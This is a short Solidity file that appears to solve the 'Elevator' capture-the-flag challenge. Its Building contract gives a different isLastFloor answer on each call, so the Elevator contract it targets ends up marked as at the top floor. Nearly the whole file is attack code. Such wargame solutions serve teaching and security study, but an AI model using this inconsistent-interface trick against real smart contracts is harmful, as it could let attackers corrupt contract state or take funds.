//SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.7.0 <0.9.0;

import "./2_Owner.sol";

contract Elevator {
    function goTo(uint _floor) public { }
}

contract Building {

    Elevator elevatorContract;
    bool private seen;

    constructor () {
        seen = false;
    }

    function attackElevator() external {
        elevatorContract.goTo(1);
    }

    function setContract(address _contract) external {
        elevatorContract = Elevator(_contract);
    }

    function isLastFloor(uint) external returns (bool) {
        if (!seen) {
            seen = true;
            return false;
        }
        else
        {
            return true;
        }
    }
}